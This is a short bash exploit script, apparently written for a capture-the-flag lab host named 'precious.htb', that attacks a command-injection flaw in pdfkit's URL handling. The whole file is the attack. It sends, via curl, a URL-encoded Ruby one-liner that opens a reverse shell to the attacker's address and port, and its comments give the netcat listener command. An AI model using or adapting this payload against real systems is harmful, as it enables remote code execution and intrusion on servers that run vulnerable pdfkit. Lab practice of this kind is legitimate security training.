#!/bin/bash

# Run this on your local to listen for a reverse shell
# nc -lvnp 9010

# reverse shell exploit for pdfkit connector to reverse shell command


#http://%20`ruby -rsocket -e 'c=TCPSocket.new("10.10.16.70","9010");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'`

LHOST=10.10.16.70
LPORT=9010
RHOST=10.10.11.189
RPORT=80

main (){
    data="url=http%3A%2F%2F%2520%60ruby+-rsocket+-e+%27c%3DTCPSocket.new%28%22${LHOST}%22%2C%22${LPORT}%22%29%3Bwhile%28cmd%3Dc.gets%29%3BIO.popen%28cmd%2C%22r%22%29%7B%7Cio%7Cc.print+io.read%7Dend%27%60"
    echo "${data}"
    curl http://${RHOST}:${RPORT}/ -v -H 'Host: precious.htb' -d $data --output -
}

main
